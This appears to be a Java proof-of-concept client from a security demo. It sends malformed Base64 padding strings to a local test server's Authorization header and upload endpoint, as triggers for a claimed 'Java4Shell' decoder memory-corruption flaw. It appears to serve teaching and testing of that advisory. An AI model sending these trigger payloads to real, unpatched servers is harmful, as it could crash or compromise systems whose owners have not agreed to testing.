import java.io.IOException;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URI;
import java.util.Base64;

/**
 * Educational PoC client for VulnServer.java.
 *
 * Sends the kind of malformed-padding Base64 tails the Java4Shell advisory
 * describes as the trigger (a lone "=", "X=", "===") to both the
 * Authorization header (pre-auth decode site) and the /upload body (direct
 * decode site). On real affected hardware + an unpatched JDK, these tails
 * are what would reach the vulnerable AVX-512 masked-store stub. On this
 * JVM they just exercise the normal, safe Base64 decoder and get rejected
 * with IllegalArgumentException -> HTTP 400/401.
 */
public class PocClient {

    public static void main(String[] args) throws Exception {
        String host = args.length > 0 ? args[0] : "http://127.0.0.1:8099";

        System.out.println("== Java4Shell PoC client (safe demo against VulnServer) ==\n");

        // Well-formed baseline: valid base64 of "user:pass", so decode
        // succeeds AND the credential check runs normally (-> 401), to
        // contrast with the malformed tails below.
        String wellFormed = Base64.getEncoder().encodeToString("baduser:badpass".getBytes());

        // --- 1. Pre-auth decode site: Authorization header ---
        System.out.println("[client] Hitting GET / with malformed Basic auth tails (pre-auth decode site)");
        sendWithAuthHeader(host, wellFormed, "well-formed baseline");
        for (String tail : new String[] {"=", "X=", "==="}) {
            // 64 'A' characters (a full, valid block) + the malformed tail,
            // matching the advisory's "64 A characters followed by =" example.
            String payload = repeat('A', 64) + tail;
            sendWithAuthHeader(host, payload, tail);
        }

        // --- 2. Direct decode site: /upload body ---
        System.out.println("\n[client] Hitting POST /upload with the same malformed tails (direct decode site)");
        sendUpload(host, wellFormed, "well-formed baseline");
        for (String tail : new String[] {"=", "X=", "==="}) {
            String payload = repeat('A', 64) + tail;
            sendUpload(host, payload, tail);
        }

        System.out.println("\n[client] Done. Run `java MaskUnderflowSim` to see the underlying mask-underflow");
        System.out.println("[client] arithmetic that these malformed tails would trigger on real AVX-512 hardware.");
    }

    private static String repeat(char c, int n) {
        StringBuilder sb = new StringBuilder(n);
        for (int i = 0; i < n; i++) sb.append(c);
        return sb.toString();
    }

    private static void sendWithAuthHeader(String host, String rawBasicValue, String tailLabel) throws IOException {
        URI uri = URI.create(host + "/");
        HttpURLConnection conn = (HttpURLConnection) uri.toURL().openConnection();
        conn.setRequestMethod("GET");
        // Note: we send the malformed value directly as the Basic credential
        // payload, which is exactly what BasicAuthenticator base64-decodes.
        conn.setRequestProperty("Authorization", "Basic " + rawBasicValue);
        try {
            int status = conn.getResponseCode();
            System.out.println("  tail=\"" + tailLabel + "\" -> HTTP " + status);
        } catch (IOException e) {
            // The JDK's own BasicAuthenticator.authenticate() throws
            // IllegalArgumentException when Base64.decode() rejects the
            // malformed tail; HttpServer's internal exchange handling then
            // drops the connection instead of sending a response. That is
            // exactly the decode call site the advisory flags — on this
            // safe JVM it just fails loudly instead of corrupting memory.
            System.out.println("  tail=\"" + tailLabel + "\" -> connection dropped (decode threw inside BasicAuthenticator: "
                + e.getMessage() + ")");
        }
        conn.disconnect();
    }

    private static void sendUpload(String host, String payload, String tailLabel) throws IOException {
        URI uri = URI.create(host + "/upload");
        HttpURLConnection conn = (HttpURLConnection) uri.toURL().openConnection();
        conn.setRequestMethod("POST");
        conn.setDoOutput(true);
        byte[] bytes = payload.getBytes();
        conn.setFixedLengthStreamingMode(bytes.length);
        try (OutputStream os = conn.getOutputStream()) {
            os.write(bytes);
        }
        int status = conn.getResponseCode();
        System.out.println("  tail=\"" + tailLabel + "\" -> HTTP " + status);
        conn.disconnect();
    }
}
